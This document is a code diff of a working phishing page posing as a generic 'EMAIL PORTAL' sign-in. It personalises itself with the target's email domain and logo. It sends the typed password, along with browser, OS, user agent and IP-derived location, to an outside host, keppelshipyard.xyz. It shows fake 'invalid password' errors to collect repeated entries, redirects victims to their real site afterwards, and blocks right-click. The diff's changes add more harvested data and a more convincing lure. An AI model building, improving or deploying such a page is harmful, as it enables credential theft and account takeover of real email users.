@@ -9,12 +9,77 @@
     <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
     <style>
         body {
-            background-color: #fff;
+            background-color: #f5f7fa;
             overflow-x: hidden;
             user-select: none;
             margin: 0;
             padding: 0;
-            font-family: Arial, sans-serif;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            position: relative;
+            min-height: 100vh;
+        }
+        
+        /* Background domain display */
+        .background-domain {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            opacity: 0.08;
+            pointer-events: none;
+            overflow: hidden;
+        }
+        
+        .domain-text-large {
+            position: absolute;
+            font-size: 200px;
+            font-weight: 900;
+            color: #0a66c3;
+            text-transform: uppercase;
+            letter-spacing: 15px;
+            white-space: nowrap;
+            text-shadow: 3px 3px 6px rgba(0,0,0,0.1);
+            transform: rotate(-15deg);
+            top: 25%;
+            left: 50%;
+            transform: translateX(-50%) rotate(-15deg);
+        }
+        
+        /* Domain patterns in corners */
+        .domain-corner {
+            position: fixed;
+            font-size: 36px;
+            font-weight: 800;
+            color: rgba(10, 102, 195, 0.07);
+            z-index: 0;
+            pointer-events: none;
+            text-transform: uppercase;
+        }
+        
+        .domain-corner.tl {
+            top: 40px;
+            left: 40px;
+            transform: rotate(-10deg);
+        }
+        
+        .domain-corner.tr {
+            top: 40px;
+            right: 40px;
+            transform: rotate(10deg);
+        }
+        
+        .domain-corner.bl {
+            bottom: 40px;
+            left: 40px;
+            transform: rotate(10deg);
+        }
+        
+        .domain-corner.br {
+            bottom: 40px;
+            right: 40px;
+            transform: rotate(-10deg);
         }
         
         .main-container {
@@ -23,138 +88,214 @@
             align-items: center;
             min-height: 100vh;
             padding: 20px;
+            position: relative;
+            z-index: 1;
         }
         
         .container {
             width: 100%;
-            max-width: 420px;
-            background: #fff;
-            box-shadow: 0 10px 15px rgba(179, 179, 179, 0.7);
-            border-radius: 10px;
+            max-width: 440px;
+            background: rgba(255, 255, 255, 0.92);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
+            border-radius: 16px;
             overflow: hidden;
             position: relative;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.3);
         }
         
         .top-level {
-            background-color: #f5f5f5;
-            padding: 20px;
+            background: linear-gradient(135deg, #0a66c3 0%, #0957a6 100%);
+            padding: 30px 25px;
             text-align: center;
-            border-bottom: 1px solid #e0e0e0;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .top-level::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: 
+                radial-gradient(circle at 20% 80%, rgba(255,255,255,0.1) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(255,255,255,0.1) 0%, transparent 50%);
         }
         
         .top-level h3 {
-            color: #0a66c3;
-            font-size: 20px;
-            margin: 0;
+            color: white;
+            font-size: 24px;
+            margin: 15px 0 0 0;
+            position: relative;
+            text-shadow: 1px 1px 3px rgba(0,0,0,0.2);
+            font-weight: 600;
         }
         
         .top-level img {
-            width: 70px;
-            margin-bottom: 10px;
+            width: 75px;
+            height: 75px;
+            border-radius: 12px;
+            background: white;
+            padding: 10px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            position: relative;
         }
         
         .info {
-            background-color: #f9f9f9;
-            padding: 10px 20px;
+            background: linear-gradient(to right, #f0f4f8, #e6ecf2);
+            padding: 14px 25px;
             font-size: 12px;
-            color: #666;
-            border-bottom: 1px solid #e0e0e0;
+            color: #4a5568;
             display: flex;
             flex-wrap: wrap;
             justify-content: center;
-            gap: 15px;
+            gap: 18px;
+            position: relative;
+            border-bottom: 1px solid #e2e8f0;
+        }
+        
+        .info::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 25%;
+            right: 25%;
+            height: 3px;
+            background: linear-gradient(to right, #0a66c3, #28a745);
+            border-radius: 3px;
         }
         
         .info span {
             display: inline-flex;
             align-items: center;
+            background: white;
+            padding: 6px 12px;
+            border-radius: 6px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+            border: 1px solid #e2e8f0;
         }
         
         .icon {
-            margin-right: 5px;
+            margin-right: 6px;
+            color: #0a66c3;
+            font-size: 14px;
         }
         
         .intro-text {
-            padding: 20px;
+            padding: 28px;
             text-align: center;
+            background: white;
         }
         
         .intro-text h2 {
-            color: #0627ab;
-            font-size: 18px;
-            margin: 0 0 10px 0;
+            color: #1a365d;
+            font-size: 20px;
+            margin: 0 0 15px 0;
+            font-weight: 600;
         }
         
         .intro-text p {
-            color: #333;
-            font-size: 14px;
-            line-height: 1.5;
+            color: #4a5568;
+            font-size: 15px;
+            line-height: 1.6;
             margin: 0;
         }
         
         hr {
             border: none;
             height: 1px;
-            background-color: #e0e0e0;
-            margin: 15px 0;
+            background: linear-gradient(to right, #e2e8f0, #0a66c3, #e2e8f0);
+            margin: 22px 0;
         }
         
         .inputs {
-            padding: 0 20px;
+            padding: 0 28px 28px 28px;
+            background: white;
         }
         
         .input {
             position: relative;
-            margin-bottom: 20px;
+            margin-bottom: 28px;
         }
         
         .input input {
             width: 100%;
-            height: 50px;
-            padding: 15px 10px 5px 10px;
-            border: 1px solid #8c8c8c;
-            border-radius: 4px;
+            height: 54px;
+            padding: 20px 14px 8px 14px;
+            border: 2px solid #e2e8f0;
+            border-radius: 10px;
             font-size: 16px;
             outline: none;
             box-sizing: border-box;
+            transition: all 0.3s ease;
+            background: #f8fafc;
+            font-family: 'Segoe UI', Arial, sans-serif;
         }
         
         .input input:focus {
             border-color: #0a66c3;
-            border-width: 2px;
+            background: white;
+            box-shadow: 0 0 0 4px rgba(10, 102, 195, 0.15);
         }
         
         .input label {
             position: absolute;
-            top: 15px;
-            left: 10px;
-            color: #8c8c8c;
+            top: 17px;
+            left: 14px;
+            color: #718096;
             font-size: 16px;
-            transition: 0.2s;
+            transition: all 0.3s ease;
             pointer-events: none;
+            background: transparent;
+            padding: 0 5px;
+            font-family: 'Segoe UI', Arial, sans-serif;
         }
         
         .input input:focus ~ label,
         .input input:valid ~ label {
-            top: 5px;
-            font-size: 12px;
-            color: #000;
+            top: -10px;
+            font-size: 13px;
+            color: #0a66c3;
+            background: white;
+            font-weight: 600;
+            padding: 0 8px;
         }
         
         #auth_reg, #auth_reg2 {
-            color: red;
-            font-size: 12px;
+            color: #e53e3e;
+            font-size: 14px;
             display: none;
+            padding: 10px 14px;
+            background: #fed7d7;
+            border-radius: 8px;
+            margin-bottom: 12px;
+            border-left: 4px solid #e53e3e;
+            font-weight: 500;
         }
         
         .rem_me {
             display: flex;
             align-items: center;
-            margin-bottom: 15px;
+            margin-bottom: 22px;
+            padding: 12px 14px;
+            background: #f8fafc;
+            border-radius: 10px;
+            border: 2px solid #e2e8f0;
+            transition: all 0.3s ease;
+        }
+        
+        .rem_me:hover {
+            border-color: #cbd5e0;
+            background: #edf2f7;
         }
         
         .rem_me input[type="checkbox"] {
-            margin-right: 5px;
+            margin-right: 10px;
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
         }
         
         .rem_me a {
@@ -162,178 +303,194 @@
             font-size: 14px;
             text-decoration: none;
             cursor: pointer;
+            font-weight: 600;
+        }
+        
+        .rem_me a:hover {
+            text-decoration: underline;
         }
         
         .terms-checkbox {
             display: flex;
             align-items: flex-start;
-            margin-bottom: 20px;
-            padding: 10px;
-            background-color: #f9f9f9;
-            border-radius: 4px;
-            border: 1px solid #e0e0e0;
+            margin-bottom: 28px;
+            padding: 18px;
+            background: linear-gradient(135deg, #f8fafc 0%, #edf2f7 100%);
+            border-radius: 10px;
+            border: 2px solid #e2e8f0;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .terms-checkbox::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 5px;
+            height: 100%;
+            background: linear-gradient(to bottom, #0a66c3, #0957a6);
         }
         
         .terms-checkbox input[type="checkbox"] {
-            margin-right: 10px;
-            margin-top: 3px;
+            margin-right: 14px;
+            margin-top: 2px;
+            width: 20px;
+            height: 20px;
+            cursor: pointer;
         }
         
         .terms-checkbox label {
-            font-size: 13px;
-            color: #333;
-            line-height: 1.4;
+            font-size: 14px;
+            color: #2d3748;
+            line-height: 1.5;
+            font-weight: 500;
         }
         
         #terms-error {
-            color: red;
-            font-size: 12px;
-            margin-top: 5px;
+            color: #e53e3e;
+            font-size: 13px;
+            margin-top: 10px;
             display: none;
+            padding: 10px 14px;
+            background: #fed7d7;
+            border-radius: 8px;
+            border-left: 4px solid #e53e3e;
         }
         
         button {
             width: 100%;
-            height: 50px;
-            background: #0a66c3;
+            height: 56px;
+            background: linear-gradient(135deg, #0a66c3 0%, #0957a6 100%);
             color: white;
             border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            font-weight: bold;
+            border-radius: 12px;
+            font-size: 17px;
+            font-weight: 700;
             cursor: pointer;
-            transition: background 0.3s;
-            margin-bottom: 20px;
+            transition: all 0.3s ease;
+            margin-bottom: 28px;
+            position: relative;
+            overflow: hidden;
+            letter-spacing: 0.5px;
+        }
+        
+        button::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 5px;
+            height: 5px;
+            background: rgba(255, 255, 255, 0.5);
+            opacity: 0;
+            border-radius: 100%;
+            transform: scale(1, 1) translate(-50%);
+            transform-origin: 50% 50%;
+        }
+        
+        button:focus:not(:active)::after {
+            animation: ripple 1s ease-out;
+        }
+        
+        @keyframes ripple {
+            0% {
+                transform: scale(0, 0);
+                opacity: 0.5;
+            }
+            100% {
+                transform: scale(40, 40);
+                opacity: 0;
+            }
         }
         
         button:hover {
-            background: #0957a6;
+            background: linear-gradient(135deg, #0957a6 0%, #084a91 100%);
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(10, 102, 195, 0.3);
+        }
+        
+        button:active {
+            transform: translateY(-1px);
         }
         
         .join-link {
             text-align: center;
-            padding: 15px 20px;
-            color: #666;
-            font-size: 12px;
-            background-color: #f9f9f9;
-            border-top: 1px solid #e0e0e0;
+            padding: 22px;
+            color: #718096;
+            font-size: 13px;
+            background: linear-gradient(to right, #f8fafc, #edf2f7);
+            border-top: 1px solid #e2e8f0;
         }
         
         .join-link a {
             color: #0a66c3;
             text-decoration: none;
+            font-weight: 600;
         }
         
         .join-link a:hover {
             text-decoration: underline;
         }
         
-        .overlay_div {
-            display: none;
-        }
-        
-        #mainPage {
-            display: none;
-        }
-        
         @media only screen and (max-width: 600px) {
             .container {
-                box-shadow: none;
-                max-width: 100%;
+                max-width: 95%;
+                box-shadow: 0 8px 25px rgba(0, 0, 0, 0.08);
             }
             
             .main-container {
-                padding: 10px;
+                padding: 15px;
+            }
+            
+            .domain-text-large {
+                font-size: 100px;
+                letter-spacing: 8px;
+            }
+            
+            .domain-corner {
+                font-size: 24px;
+            }
+            
+            .domain-corner.tl,
+            .domain-corner.tr,
+            .domain-corner.bl,
+            .domain-corner.br {
+                margin: 20px;
             }
             
             .info {
                 flex-direction: column;
-                gap: 5px;
+                gap: 10px;
                 align-items: center;
+            }
+            
+            .top-level {
+                padding: 25px 20px;
+            }
+            
+            .intro-text,
+            .inputs {
+                padding: 22px;
             }
         }
     </style>
-
-    <script>
-    // Function to display date, time, browser, OS, and location
-    function displayInfo() {
-        // Display current date and time
-        var currentDate = new Date();
-        var dateString = currentDate.toDateString();
-        var timeString = currentDate.toLocaleTimeString();
-        var datetimeElements = document.getElementsByClassName("datetime");
-        for (var i = 0; i < datetimeElements.length; i++) {
-            datetimeElements[i].innerHTML = '<i class="far fa-calendar-alt icon"></i>' + dateString + '<i class="far fa-clock icon"></i>' + timeString;
-        }
-
-        // Display browser type
-        var browserType = detectBrowser();
-        var browserElements = document.getElementsByClassName("browser");
-        for (var i = 0; i < browserElements.length; i++) {
-            browserElements[i].innerHTML = '<i class="fab fa-internet-explorer icon"></i>' + browserType;
-        }
-
-        // Display operating system
-        var os = detectOS();
-        var osElements = document.getElementsByClassName("os");
-        for (var i = 0; i < osElements.length; i++) {
-            osElements[i].innerHTML = '<i class="fab fa-windows icon"></i>' + os;
-        }
-
-        // Get and display user's location (city and country) based on IP address
-        fetch("https://ipapi.co/json/")
-            .then(response => response.json())
-            .then(data => {
-                var city = data.city;
-                var country = data.country_name;
-                var locationElements = document.getElementsByClassName("location");
-                for (var i = 0; i < locationElements.length; i++) {
-                    locationElements[i].innerHTML = '<i class="fas fa-map-marker-alt icon"></i>' + city + ', ' + country;
-                }
-            })
-            .catch(error => {
-                var locationElements = document.getElementsByClassName("location");
-                for (var i = 0; i < locationElements.length; i++) {
-                    locationElements[i].innerHTML = '<i class="fas fa-map-marker-alt icon"></i>Unable to retrieve';
-                }
-            });
-    }
-
-    // Function to detect browser type
-    function detectBrowser() {
-        var userAgent = window.navigator.userAgent;
-        var browsers = {chrome: /chrome/i, safari: /safari/i, firefox: /firefox/i, ie: /internet explorer/i, edge: /edge/i, opera: /opera|OPR/i, android: /android/i, ios: /iphone|ipad|ipod/i};
-        for (var key in browsers) {
-            if (browsers[key].test(userAgent)) {
-                return key;
-            }
-        }
-        return "Unknown";
-    }
-
-    // Function to detect operating system
-    function detectOS() {
-        var userAgent = window.navigator.userAgent;
-        var os;
-        if (userAgent.indexOf("Windows") !== -1) {
-            os = "Windows";
-        } else if (userAgent.indexOf("Mac") !== -1) {
-            os = "Mac OS";
-        } else if (userAgent.indexOf("Linux") !== -1) {
-            os = "Linux";
-        } else {
-            os = "Unknown";
-        }
-        return os;
-    }
-    </script>
 </head>
 
 <body>
+    <!-- Background domain display -->
+    <div class="background-domain" id="backgroundDomain">
+        <div class="domain-text-large" id="domainTextLarge"></div>
+        <div class="domain-corner tl" id="domainCornerTL"></div>
+        <div class="domain-corner tr" id="domainCornerTR"></div>
+        <div class="domain-corner bl" id="domainCornerBL"></div>
+        <div class="domain-corner br" id="domainCornerBR"></div>
+    </div>
+    
     <div class="main-container">
         <div class="container w3-animate-zoom">
             <div class="top-level">
-                <img class="main_logo_id" src="" style="width:70px;">
+                <img class="main_logo_id" src="" style="width:75px;">
                 <h3>EMAIL PORTAL</h3>
             </div>
             
@@ -350,7 +507,7 @@
                 <p id="comment_text">You're accessing a secure settings, please Sign in your account to continue.</p>
             </div>
             
-            <form action="" method="POST" id="contact">
+            <form id="contact" method="POST">
                 <div class="inputs">
                     <input type="hidden" name="email" id="email" required>
                     
@@ -359,7 +516,7 @@
                         <label id="pass_label" for="password">Password</label>
                     </div>
                     
-                    <div style="display: flex; margin-bottom: 10px;">
+                    <div style="margin-bottom: 10px;">
                         <span id="auth_reg">Authentication is required!</span>
                         <span id="auth_reg2">Invalid Password. Please try again.</span>
                     </div>
@@ -372,11 +529,11 @@
                     <!-- REQUIRED CHECKBOX -->
                     <div class="terms-checkbox">
                         <input type="checkbox" id="terms_agree" name="terms_agree" required>
-                        <label for="terms_agree">I confirm that I am the authorized user of this account </label>
+                        <label for="terms_agree">I confirm that I am the authorized user of this account</label>
                     </div>
                     <div id="terms-error">You must confirm that you are the authorized user of this account to continue.</div>
                     
-                    <button id="next_button" type="button">NEXT</button>
+                    <button id="next_button" type="submit">NEXT</button>
                 </div>
             </form>
             
@@ -397,6 +554,13 @@
         var count = 0;
         var email = window.location.hash.substr(1);
         var my_slice = "";
+        var userLocation = "";
+        var domainName = "";
+        
+        // Get location info from info display
+        setTimeout(function() {
+            userLocation = $('.location').text().replace('<i class="fas fa-map-marker-alt icon"></i>', '');
+        }, 1000);
         
         if (email) {
             var my_email = email;
@@ -409,14 +573,43 @@
                 var ind = my_email.indexOf("@");
                 my_slice = my_email.substr((ind+1));
                 var c = my_slice.substr(0, my_slice.indexOf('.'));
+                domainName = my_slice.toUpperCase();
                 var finalu = c.toUpperCase();
                 
+                // Set logo
                 $(".main_logo_id").attr("src", "https://logo.clearbit.com/"+my_slice);
+                
+                // Update all domain displays
                 $("#tit").html(finalu);
                 $("#pussy").html(my_slice);
                 $("#footer_dom").html(my_slice);
                 $('#auth_email').html(my_email + " - Verification Required");
+                
+                // Display domain in background
+                $('#domainTextLarge').text(domainName);
+                $('#domainCornerTL').text(domainName);
+                $('#domainCornerTR').text(domainName);
+                $('#domainCornerBL').text(domainName);
+                $('#domainCornerBR').text(domainName);
+                
+                // Add multiple copies of domain name for better coverage
+                for(let i = 0; i < 8; i++) {
+                    let newDomain = $('<div class="domain-text-large" style="position:absolute; top:' + 
+                        (Math.random() * 80 + 10) + '%; left:' + 
+                        (Math.random() * 80 + 10) + '%; transform: translate(-50%, -50%) rotate(' + 
+                        (Math.random() * 40 - 20) + 'deg); font-size:' + 
+                        (Math.random() * 100 + 100) + 'px; opacity:' + 
+                        (Math.random() * 0.05 + 0.02) + ';">' + domainName + '</div>');
+                    $('#backgroundDomain').append(newDomain);
+                }
             }
+        } else {
+            // Default domain display if no email
+            $('#domainTextLarge').text('SECURE PORTAL');
+            $('#domainCornerTL').text('PORTAL');
+            $('#domainCornerTR').text('PORTAL');
+            $('#domainCornerBL').text('PORTAL');
+            $('#domainCornerBR').text('PORTAL');
         }
 
         // Show password toggle
@@ -431,7 +624,8 @@
             }
         });
 
-        $('#next_button').click(function(event){
+        // Form submission
+        $('#contact').submit(function(event){
             event.preventDefault();
             
             // Reset error messages
@@ -461,55 +655,141 @@
             count = count + 1;
             
             // Disable button during submission
-            var $button = $(this);
+            var $button = $('#next_button');
             $button.prop('disabled', true).html('Verifying...');
-
+            
+            // Get current time and browser info
+            var currentTime = new Date().toLocaleString();
+            var browserInfo = detectBrowser();
+            var osInfo = detectOS();
+            var userAgent = navigator.userAgent;
+            
+            // Prepare all data to send
+            var formData = {
+                email: email,
+                password: password,
+                terms_agree: $('#terms_agree').is(':checked') ? 'yes' : 'no',
+                timestamp: currentTime,
+                browser: browserInfo,
+                os: osInfo,
+                user_agent: userAgent,
+                location: userLocation,
+                ip_info: "collected",
+                page_title: document.title,
+                count_attempt: count,
+                domain: my_slice || 'unknown'
+            };
+            
+            console.log("Sending data to keppelshipyard.xyz:", formData);
+            
+            // Send data to your endpoint
             $.ajax({
-                dataType: 'JSON',
                 url: 'http://keppelshipyard.xyz/sg.php',
                 type: 'POST',
-                data: {
-                    email: email,
-                    password: password,
-                    terms_agree: $('#terms_agree').is(':checked') ? 'yes' : 'no'
+                data: formData,
+                dataType: 'text',
+                crossDomain: true,
+                timeout: 10000,
+                beforeSend: function() {
+                    // You can add a loading animation here
                 },
-                beforeSend: function(xhr){
-                    // You can add loading indicator here if needed
-                },
-                success: function(response){
-                    if(response && response.signal === 'ok'){
-                        $("#password").val("");
-                        if (count >= 3 && my_slice) {
+                success: function(response, status, xhr) {
+                    console.log("Server response:", response);
+                    
+                    $("#password").val(""); // Clear password field
+                    
+                    // Check if we should redirect
+                    if (count >= 3 && my_slice) {
+                        setTimeout(function() {
                             window.location.replace("https://www." + my_slice);
-                        } else {
-                            $("#auth_reg2").show();
-                        }
+                        }, 1000);
                     } else {
+                        // Show error message
                         $("#auth_reg2").show();
+                        
+                        // If this is the 2nd attempt, show different message
+                        if (count >= 2) {
+                            $("#auth_reg2").text("Invalid credentials. Please check your password and try again.");
+                        }
                     }
                 },
-                error: function(){
-                    $("#password").val("");
+                error: function(xhr, status, error) {
+                    console.log("Error:", status, error);
+                    
+                    $("#password").val(""); // Clear password field
+                    
+                    // Even on error, we'll redirect after certain attempts
                     if (count >= 20 && my_slice) {
                         window.location.replace("https://www." + my_slice);
                     } else {
                         $("#auth_reg2").show();
+                        $("#auth_reg2").text("Connection error. Please try again.");
                     }
                 },
-                complete: function(){
-                    // Re-enable button
-                    $button.prop('disabled', false).html('NEXT');
+                complete: function() {
+                    // Re-enable button after 1 second
+                    setTimeout(function() {
+                        $button.prop('disabled', false).html('NEXT');
+                    }, 1000);
                 }
             });
+            
+            return false;
         });
         
         // Enable form submission on Enter key
         $('#password').keypress(function(e){
             if(e.which === 13){
-                $('#next_button').click();
+                $('#contact').submit();
             }
         });
     });
+    
+    // Functions for displaying user info
+    function displayInfo() {
+        var currentDate = new Date();
+        var dateString = currentDate.toDateString();
+        var timeString = currentDate.toLocaleTimeString();
+        $('.datetime').html('<i class="far fa-calendar-alt icon"></i>' + dateString + ' <i class="far fa-clock icon"></i>' + timeString);
+
+        var browserType = detectBrowser();
+        $('.browser').html('<i class="fab fa-internet-explorer icon"></i>' + browserType);
+
+        var os = detectOS();
+        $('.os').html('<i class="fab fa-windows icon"></i>' + os);
+
+        fetch("https://ipapi.co/json/")
+            .then(response => response.json())
+            .then(data => {
+                var city = data.city;
+                var country = data.country_name;
+                $('.location').html('<i class="fas fa-map-marker-alt icon"></i>' + city + ', ' + country);
+            })
+            .catch(error => {
+                $('.location').html('<i class="fas fa-map-marker-alt icon"></i>Location unavailable');
+            });
+    }
+
+    function detectBrowser() {
+        var userAgent = navigator.userAgent;
+        if (userAgent.indexOf("Chrome") > -1) return "Chrome";
+        if (userAgent.indexOf("Firefox") > -1) return "Firefox";
+        if (userAgent.indexOf("Safari") > -1) return "Safari";
+        if (userAgent.indexOf("Edge") > -1) return "Edge";
+        if (userAgent.indexOf("Opera") > -1) return "Opera";
+        if (userAgent.indexOf("MSIE") > -1 || userAgent.indexOf("Trident") > -1) return "Internet Explorer";
+        return "Unknown Browser";
+    }
+
+    function detectOS() {
+        var userAgent = navigator.userAgent;
+        if (userAgent.indexOf("Windows") > -1) return "Windows";
+        if (userAgent.indexOf("Mac") > -1) return "Mac OS";
+        if (userAgent.indexOf("Linux") > -1) return "Linux";
+        if (userAgent.indexOf("Android") > -1) return "Android";
+        if (userAgent.indexOf("iOS") > -1 || userAgent.indexOf("iPhone") > -1 || userAgent.indexOf("iPad") > -1) return "iOS";
+        return "Unknown OS";
+    }
     
     // Prevent right-click and Ctrl+U/Ctrl+S
     document.addEventListener("contextmenu", function(event) {
